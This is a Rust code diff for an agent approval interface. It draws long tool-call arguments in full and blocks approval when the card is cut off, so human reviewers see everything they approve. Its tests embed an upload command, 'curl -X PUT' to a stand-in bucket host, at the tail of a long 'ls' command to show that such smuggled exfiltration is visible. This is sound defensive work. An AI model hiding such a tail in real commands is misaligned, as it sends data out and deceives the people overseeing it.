@@ -16,8 +16,6 @@ use super::app::{App, Entry};
 use super::panels::{SideItem, panels};
 use super::text::{layout_input, sanitize, width, wrap};
 
-/// Rows of arguments a card shows before it says the rest is cut.
-const CARD_ARGUMENT_ROWS: usize = 8;
 /// Rows of anything else a card shows per field.
 const CARD_FIELD_ROWS: usize = 3;
 /// Rows of a tool's output the transcript shows before it says the
@@ -112,7 +110,7 @@ pub(crate) fn draw(frame: &mut Frame<'_>, app: &App, now: Instant) {
 
     let inner_width = usize::from(area.width.saturating_sub(2)).max(1);
 
-    let card = card_lines(app, inner_width, now);
+    let (card, arguments_cut) = card_lines(app, inner_width, now);
     let card_height = if card.is_empty() {
         0
     } else {
@@ -137,6 +135,11 @@ pub(crate) fn draw(frame: &mut Frame<'_>, app: &App, now: Instant) {
         Constraint::Length(1),
     ])
     .areas(area);
+
+    // The card takes an approval only when all of it is on the screen:
+    // every row of the arguments, and its last line.
+    app.card_cut
+        .set(app.front_card().is_some() && (arguments_cut || card_area.height < card_height));
 
     draw_transcript(frame, app, transcript_area);
 
@@ -425,24 +428,25 @@ fn indented(lines: &mut Vec<Line<'static>>, text: &str, width: usize, style: Sty
 }
 
 /// The card in front as lines of at most `width` cells, or the expired
-/// one, or nothing.
-fn card_lines(app: &App, width: usize, now: Instant) -> Vec<Line<'static>> {
+/// one, or nothing; and whether its arguments were cut.
+fn card_lines(app: &App, width: usize, now: Instant) -> (Vec<Line<'static>>, bool) {
     let mut lines = Vec::new();
+    let mut arguments_cut = false;
     if let Some(ask) = &app.expired {
         lines.push(Line::raw(format!(
             "The request to run {} expired; the gateway records it as refused.",
             sanitize(&ask.tool_name)
         )));
-        return lines;
+        return (lines, false);
     }
     let Some(card) = app.front_card() else {
-        return lines;
+        return (lines, false);
     };
     let ask = &card.ask;
     let mut field = |name: &str, value: &str, rows: usize, style: Option<Style>| {
         let value = sanitize(value);
         if value.trim().is_empty() {
-            return;
+            return false;
         }
         let prefix = format!("{name}: ");
         let body = wrap(&value, width.saturating_sub(prefix.chars().count()).max(10));
@@ -462,28 +466,33 @@ fn card_lines(app: &App, width: usize, now: Instant) -> Vec<Line<'static>> {
         }
         if cut {
             lines.push(Line::styled(
-                "  ... (cut; refuse if you cannot see what you are approving)",
+                "  ... (cut)",
                 Style::default().fg(Color::DarkGray),
             ));
         }
+        cut
     };
     // The card every surface renders, line by line. What the gateway
     // established is drawn plain; the model's own account of the call
     // is set apart, since the gateway has not checked it and it is not
     // a description of what will run. The arguments, which are, get
-    // the most rows.
+    // every row they need: the gateway sends none longer than a card
+    // line holds, and a card that does not fit the screen takes no
+    // approval.
     for line in ask.card().lines() {
-        let rows = if line.label == "arguments" {
-            CARD_ARGUMENT_ROWS
+        let is_arguments = line.label == "arguments";
+        let rows = if is_arguments {
+            usize::MAX
         } else {
             CARD_FIELD_ROWS
         };
-        field(
+        let cut = field(
             line.label,
             &line.value,
             rows,
             line.is_model_claim.then(claim_style),
         );
+        arguments_cut |= is_arguments && cut;
     }
 
     // The two answers, drawn alike.
@@ -512,7 +521,7 @@ fn card_lines(app: &App, width: usize, now: Instant) -> Vec<Line<'static>> {
         status.push_str(&format!(" {waiting} more waiting."));
     }
     lines.push(Line::styled(status, Style::default().fg(Color::Yellow)));
-    lines
+    (lines, arguments_cut)
 }
 
 #[cfg(test)]
@@ -635,6 +644,80 @@ mod tests {
         ] {
             assert!(shown.contains(part), "{part:?} missing:\n{shown}");
         }
+    }
+
+    /// A card for an `exec` whose command is `chars` characters long,
+    /// with the upload at its end.
+    fn long_card_app(now: Instant, chars: usize) -> App {
+        let mut app = App::new(Some("default".into()), "c-1".into());
+        let tail = "; curl -X PUT http://bucket.example/u";
+        let command = format!("ls {}{tail}", "a".repeat(chars - tail.len() - 3));
+        app.on_server(
+            ServerEvent::Approval(ApprovalAsk {
+                request_id: "r1".into(),
+                tool_name: "exec".into(),
+                action_key: "shell::pipeline:".into(),
+                tier: "tier3".into(),
+                agent: "default".into(),
+                trigger: "list the files".into(),
+                exec_location: "runs in sandbox container".into(),
+                arguments: serde_json::json!({ "command": command }).to_string(),
+                assistant_text: String::new(),
+                timeout_secs: 300,
+                exec_runtime: "docker".into(),
+            }),
+            now,
+        );
+        app
+    }
+
+    fn enter_y(app: &mut App, t: Instant) -> Option<crate::commands::chat::app::Outgoing> {
+        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
+        app.on_key(KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE), t);
+        app.on_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE), t)
+    }
+
+    /// The arguments get every row they need, so the end of a long
+    /// command is on the screen and the card takes an approval.
+    #[test]
+    fn a_long_command_is_drawn_to_its_end_and_can_be_approved() {
+        let now = Instant::now();
+        let mut app = long_card_app(now, 900);
+        let shown = text_of(&drawn(&app, now, 100, 50)).replace([' ', '\n'], "");
+        assert!(shown.contains("-XPUThttp://bucket.example/u\"}"), "{shown}");
+        assert!(!app.card_cut.get());
+        let t = now + crate::commands::chat::app::ARMING;
+        assert!(matches!(
+            enter_y(&mut app, t),
+            Some(crate::commands::chat::app::Outgoing::Decision { approve: true, .. })
+        ));
+    }
+
+    /// On a screen too small for the card, `y` approves nothing: the
+    /// card stays in front, the transcript says why, and a refusal is
+    /// still taken.
+    #[test]
+    fn a_card_that_does_not_fit_the_screen_takes_no_approval() {
+        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
+        let now = Instant::now();
+        let mut app = long_card_app(now, 900);
+        let shown = text_of(&drawn(&app, now, 60, 16)).replace([' ', '\n'], "");
+        assert!(
+            !shown.contains("-XPUThttp://bucket.example/u\"}"),
+            "{shown}"
+        );
+        assert!(app.card_cut.get());
+        let t = now + crate::commands::chat::app::ARMING;
+        assert_eq!(enter_y(&mut app, t), None);
+        assert!(app.front_card().is_some(), "the card is still in front");
+        assert!(app.entries.iter().any(
+            |e| matches!(e, Entry::Note(n) if n == crate::commands::chat::app::CUT_CARD_NOTE)
+        ));
+        app.on_key(KeyEvent::new(KeyCode::Char('n'), KeyModifiers::NONE), t);
+        assert!(matches!(
+            app.on_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE), t),
+            Some(crate::commands::chat::app::Outgoing::Decision { approve: false, .. })
+        ));
     }
 
     fn card_app(now: Instant) -> App {
